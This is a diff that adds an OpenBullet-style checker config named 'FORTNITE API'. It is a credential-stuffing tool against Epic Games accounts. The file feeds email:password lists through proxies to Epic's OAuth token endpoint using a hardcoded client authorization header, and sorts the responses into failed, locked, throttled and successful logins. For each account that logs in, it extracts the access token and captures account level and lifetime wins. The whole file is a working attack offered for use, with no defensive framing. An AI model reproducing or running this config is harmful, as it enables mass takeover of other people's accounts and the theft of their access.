@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "FORTNITE API",
+  "SuggestedBots": 50,
+  "LastModified": "2018-08-04T12:32:13.0414227+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&includePerms=true&token_type=eg1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry the account credentials you are using are invalid" 
+  KEYCHAIN Failure OR 
+    KEY "errors.com.epicgames.account.account_locked" 
+  KEYCHAIN Ban OR 
+    KEY "throttling" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+PARSE "<SOURCE>" LR "\"account_id\" : \"" "\"" Recursive=FALSE -> VAR "ACCID" "" "" 
+PARSE "<SOURCE>" LR "\"access_token\" : \"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/<ACCID>/client/QueryProfile?profileId=athena&rvn=-1" AutoRedirect=TRUE 
+  CONTENT "{\"{}\":\"\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: bearer <TOKEN>" 
+PARSE "<SOURCE>" LR "accountLevel\":" ",\"" Recursive=FALSE -> CAP "ACCOUNT LEVEL" "" "" 
+PARSE "<SOURCE>" LR "lifetime_wins\":" "," Recursive=FALSE -> CAP "WINS" "" "" 
